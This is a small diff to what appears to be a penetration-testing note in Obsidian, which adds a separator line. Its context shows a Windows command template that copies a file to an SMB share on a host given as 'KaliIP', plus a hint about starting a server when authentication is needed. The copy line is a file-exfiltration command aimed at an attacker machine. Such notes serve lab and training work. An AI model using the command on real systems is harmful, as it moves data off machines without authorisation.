@@ -23,6 +23,8 @@ const command = `copy C:\\Path\\\To\\\File.txt Z:\\\\${KaliIP}\\\share\\`;
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 
+---
+
 **If Windows requires authentication:**
 
 Start the server with:
